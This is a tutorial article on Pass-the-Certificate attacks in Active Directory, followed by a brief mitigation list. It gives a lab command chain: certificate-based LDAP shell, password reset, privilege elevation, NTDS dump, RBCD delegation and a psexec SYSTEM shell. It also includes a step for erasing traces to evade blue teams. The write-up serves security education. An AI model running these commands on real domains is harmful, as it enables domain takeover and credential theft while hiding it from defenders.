@@ -1,0 +1,81 @@
+<p>A Detailed Guide on PassTheCert
+Pass-the-Certificate is a highly effective Kerberos privilege escalation method that bypasses traditional password-based authentication. Instead of relying on passwords or hashes, it uses X.509 certificates and private keys to exploit the PKINIT (Public Key Cryptography for Initial Authentication) extension. This allows attackers to obtain a Ticket-Granting Ticket (TGT), granting them unauthorized access to network resources.
+By leveraging the security vulnerabilities in Kerberos authentication, Pass-the-Certificate is a serious threat to organizations relying on this protocol. Understanding how Pass-the-Certificate works and implementing countermeasures is essential for safeguarding Kerberos-based systems against sophisticated attacks.
+Table of Content
+- Overview the Pass-The-certificate (PtC)
+- Prerequisites
+- Enumeration &amp; Exploitation
+- Mitigation
+Overview the Pass-The-certificate (PtC)
+In traditional Active Directory exploitation, Pass-the-Hash and Pass-the-Ticket attacks are widely known. Pass-the-Certificate is a more modern and stealthy technique that leverages X.509 certificates instead of NTLM hashes or Kerberos tickets to authenticate and escalate privileges across an AD environment.
+What is Pass-the-Certificate?
+Pass-the-Certificate (PtC) is a post-exploitation technique where an attacker uses a certificate and its corresponding private key to authenticate to Active Directory services, all without knowing or needing the user’s password. It is possible due to:
+- PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) – allows Kerberos to use certificates instead of passwords.
+- Schannel (Secure Channel) – permits certificate-based authentication over LDAP, SMB, and other services.
+If an attacker can extract or generate a certificate associated with a privileged user (like Administrator), they can impersonate that user indefinitely as long as the cert is valid.
+Why Is This Dangerous?
+- Bypasses Password Policies – MFA, lockout thresholds, and password changes don’t help.
+- Long-Lived Access – Certs typically have longer validity (months to years).
+- Stealthy – May not trigger alerts if PKINIT and Schannel usage aren’t monitored.
+- RBCD Abuse – In combination with Resource-Based Constrained Delegation (RBCD), it can lead to full domain compromise.
+Prerequisite
+- Windows Server 2019 as Active Directory that supports PKINIT
+- Domain must have Active Directory Certificate Services and Certificate Authority configured.
+- Kali Linux packed with tools
+- Tools: Certipy, passthecert.py (Python version), nxc smb, impacket-getST, impacket-psexec.
+In this walkthrough, we assume: A privileged certificate (administrator.pfx) is already available (e.g., obtained in previous AD CS attack chains).
+Enumeration &amp; Exploitation
+We’ll start with a valid .pfx file for a high-privileged user (Administrator), extract the certificate and private key, then use tools like passthecert.py, impacket-getST, and psexec to pivot, elevate, and ultimately achieve full domain dominance.
+Extract Certificate and Private Key
+certipy-ad cert -pfx administrator.pfx -nokey -out admin.crt certipy-ad cert -pfx administrator.pfx -nocert -out admin.key
+We separate the PFX into a certificate (admin.crt) and private key (admin.key) for passthecert.py, as the private key is essential for authentication. This ensures compatibility with TLS or LDAP-based authentication systems.
+Launch an LDAP Shell as Administrator
+python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20
+After separating the PFX into a certificate and private key, this method uses those to establish an interactive LDAP shell authenticated as Administrator via TLS Schannel, bypassing Kerberos. It’s useful when PKINIT fails, allowing direct administrative control via LDAP.
+Reset a User’s Password via Certificate
+python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -target sanjeet -new-pass Password@3
+This step modifies the target user (sanjeet) to set a new password (Password@3), impersonating Administrator. It allows us to pivot by gaining control over another account’s credentials.
+Elevate raj via Cert-Auth
+python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -target raj -elevate
+The command used to elevate the privileges of raj by modifying their account, using the certificate (admin.crt) and private key (admin.key) for authentication.
+Validate Elevated Privilege Access
+nxc smb 192.168.1.20 -u raj -p 'Password@1' –ntds
+This step attempts the NTDS dump again using raj, now with upgraded privileges. It highlights that the certificate-based elevation effectively provided real-world control, enabling us to execute the dump with escalated permissions.
+Add a New Computer Account (HULK)
+python3 passthecert.py -action add_computer -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -computer-name HULK -computer-pass Password@2
+This step creates a computer object HULK$ in the domain, setting up a machine account for Resource-Based Constrained Delegation (RBCD) chaining. This establishes the foundation for further escalation through RBCD, which will be configured in the next step from HULK to DC01$, enabling us to delegate privileges and move laterally across the network.
+Configure RBCD (Delegation) from HULK to DC01$
+python3 passthecert.py -action write_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$ -delegate-from HULK$
+This step adds ACES in msDS-AllowedToActOnBehalfOfOtherIdentity, granting HULK$ the ability to impersonate DC01$. This action enables us to perform actions on behalf of the DC01 machine, leveraging the RBCD configuration to escalate privileges and gain further access within the domain.
+Impersonate via kerberos using GetST
+impacket-getST ignite.local/'HULK$':Password@3 -spn cifs/DC01.ignite.local -impersonate administrator -dc-ip 192.168.1.20
+This step requests a CIFS Service Ticket (TGS) for DC01$, impersonating Administrator. By using the RBCD chain (HULK$ → DC01$), it instructs Active Directory to issue a fully delegated Kerberos ticket for Administrator access, setting up the next step to execute psexec with elevated privileges.
+Load Ticket and Achieve SYSTEM Shell
+KRB5CCNAME=administrator@cifs_DC01.ignite.local@IGNITE.LOCAL.ccache impacket-psexec ignite.local/administrator@Dc01.ignite.local -k -no-pass -dc-ip 192.168.1.20
+This step loads the cached Service Ticket (TGS) into the Kerberos cache. Then, using PsExec, we authenticate as Administrator without a password. By leveraging the TGS from impacket-getST, we impersonate Administrator, thus completing the escalation chain that began with admin.crt and admin.key along with RBCD.
+Read RBCD Entries (Verify Delegation Config)
+python3 passthecert.py -action read_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$
+This checks the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on DC01$, confirming active RBCD configuration and identifying accounts (e.g., HULK$) that can impersonate users like Administrator before performing cleanup or persistence actions.
+Flush RBCD Delegation for a Target Object
+python3 passthecert.py -action flush_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to raj
+This command removes the RBCD configuration for raj, clearing the delegation ACL to erase traces of impersonation and hinder detection by blue teams.
+Re-Verify RBCD Was Flushed
+python3 passthecert.py -action read_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$
+This re-runs the first query to verify the delegation rights are removed, and if no entries are found, it confirms that flush_rbcd succeeded, ensuring proper verification for both red and blue teams.
+Mitigation
+- Limit certificate issuance to trusted roles only
+- Monitor for unusual certificate usage and Schannel binds
+- Detect unexpected User &gt; Computer delegation entries (msDS-AllowedToActOnBehalfOfOtherIdentity)
+- Audit password modifications via certificate-auth shell
+- Disable unmanaged or unused RBCD ACLs
+Author: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact here</p>
+<img src="/static/resources/20250914_171659_1.png" alt="Content image">
+<img src="/static/resources/20250914_171659_2.png" alt="Content image">
+<img src="/static/resources/20250914_171700_3.png" alt="Content image">
+<img src="/static/resources/20250914_171700_5.png" alt="Content image">
+<img src="/static/resources/20250914_171701_6.png" alt="Content image">
+<img src="/static/resources/20250914_171701_7.png" alt="Content image">
+<img src="/static/resources/20250914_171702_8.png" alt="Content image">
+<img src="/static/resources/20250914_171703_9.png" alt="Content image">
+<img src="/static/resources/20250914_171703_10.png" alt="Content image">
+<img src="/static/resources/20250914_171704_11.png" alt="Content image">
